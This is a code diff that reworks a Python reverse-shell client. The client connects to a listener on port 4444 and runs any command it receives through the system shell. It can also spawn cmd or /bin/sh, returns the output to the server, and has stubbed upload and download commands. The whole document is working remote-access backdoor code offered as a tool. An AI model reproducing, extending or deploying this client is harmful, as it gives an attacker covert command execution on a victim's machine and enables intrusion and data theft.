@@ -1,60 +1,69 @@
+import os
 import socket
 import subprocess
-import os
-import requests
-import ctypes
+import threading
 
-SERVER_IP = "127.0.0.1"
-SERVER_PORT = 4444
+IP = "127.0.0.1"
+PORT = 4444
 
-def start_client(server_ip, server_port):
-    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    client.connect((server_ip, server_port))
+def execute_command(cmd):
+    """Executes received commands and returns the output."""
+    try:
+        if cmd.lower() == "opencmd":
+            if os.name == "nt":
+                return subprocess.Popen(["cmd"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            else:
+               return subprocess.Popen(["/bin/sh"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
 
+        elif cmd.lower() == "getip":
+            return socket.gethostbyname(socket.gethostname())
+
+        elif cmd.lower() == "download":
+            return f"{cmd} functionality to be implemented later."
+        
+        elif cmd.lower() == "upload":
+            return f"{cmd} functionality to be implemented later."
+
+        else:
+            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+            return result.stdout if result.stdout else result.stderr
+
+    except Exception as e:
+        return f"Error: {e}"
+
+def handle_server_commands(sock):
+    """Receives commands from server and sends back output."""
     while True:
-        command = client.recv(1024).decode().strip()
-        # print(f"[Received Command] {command}")
+        try:
+            cmd = sock.recv(1024).decode().strip()
+            if not cmd:
+                continue
 
-        if command.lower() == "exit":
+            if cmd.lower() == "kill":
+                sock.close()
+                break
+
+            output = execute_command(cmd)
+            sock.sendall(output.encode())
+
+        except Exception as e:
+            sock.sendall(f"Error: {e}".encode())
             break
 
-        # get public ip
-        if command.lower() == "getip":
-            try:
-                r = requests.get('https://api.ipify.org?format=json')
-                response = r.json()
-                output = response['ip']
-            except requests.exceptions.RequestException as e:
-                output = f"Error fetching IP: {e}"
-            client.send(output.encode())
-            continue
-        
-        # path handling
-        if command.startswith("cd "):
-            try:
-                # extract the path
-                _, path = command.split("cd ", 1)
-                path = path.strip()
+def start_client(ip, port):
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.connect((ip, port))
 
-                # change the path
-                os.chdir(path)
+        print(f"Connected to {ip}:{port}")
 
-                # change to the new directory
-                new_dir = os.getcwd()
-                output = f"Changed directory to {new_dir}"
-            except Exception as e:
-                output = f"Error changing directory: {e}"
-        else:
-            try:
-                output = subprocess.check_output(
-                    command, shell=True, stderr=subprocess.STDOUT, text=True
-                )
-            except subprocess.CalledProcessError as e:
-                output = e.output
+        thread = threading.Thread(target=handle_server_commands, args=(sock,))
+        thread.daemon = True
+        thread.start()
 
-        client.send(output.encode())
-
-    client.close()
+        thread.join()
+    except KeyboardInterrupt:
+        sock.close()
 
 if __name__ == "__main__":
-    start_client(SERVER_IP, SERVER_PORT)
+    start_client(IP, PORT)
